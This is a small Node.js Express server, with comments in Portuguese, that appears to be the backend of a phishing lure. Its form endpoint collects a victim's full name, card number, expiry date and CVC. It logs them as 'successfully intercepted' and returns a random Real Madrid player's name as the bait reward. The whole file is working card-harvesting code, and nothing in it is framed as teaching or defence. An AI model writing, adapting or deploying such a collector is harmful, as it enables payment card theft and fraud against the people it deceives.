const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Configuração do Body Parser
app.use(bodyParser.json());

// Servir arquivos estáticos da pasta 'public'
app.use(express.static(path.join(__dirname, 'public')));

// Rota para a página inicial
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Rota para lidar com o formulário
app.post('/api/submit', (req, res) => {
    //fullname, creditnum, expirationdate, cardcode
    const { fullname, creditnum, expirationdate, cardcode } = req.body;

    if (!fullname || !creditnum || !expirationdate || !cardcode) {
        return res.status(400).json({ error: 'Nome, numero do cartão, data de validade e cvc são obrigatórios!' });
    }

    const players = [
        'Thibaut Courtois', 
        'Andriy Lunin', 
        'Éder Militão', 
        'Antonio Rüdiger', 
        'David Alaba', 
        'Jesús Vallejo', 
        'Ferland Mendy', 
        'Fran García', 
        'Daniel Carvajal', 
        'Lucas Vázquez', 
        'Aurélien Tchouaméni', 
        'Federico Valverde', 
        'Eduardo Camavinga', 
        'Luka Modric', 
        'Dani Ceballos', 
        'Toni Kroos', 
        'Jude Bellingham', 
        'Vinícius Júnior', 
        'Rodrygo', 
        'Joselu', 
        'Brahim Díaz', 
        'Endrick'
    ];
    
    const randomPlayer = players[Math.floor(Math.random() * players.length)];

    // Aqui você normalmente salvaria os dados em um banco de dados
    console.log(' [!] Informações interceptadas com sucesso!')
    console.log(` [!] Nome: ${fullname}\n [!] Numero do cartão: ${creditnum}\n [!] Data de validade: ${expirationdate}\n [!] CVC: ${cardcode}\n`);

    res.json({ player: randomPlayer });
});

app.listen(PORT, () => {
    console.log(`Servidor rodando em http://localhost:${PORT}`);
});
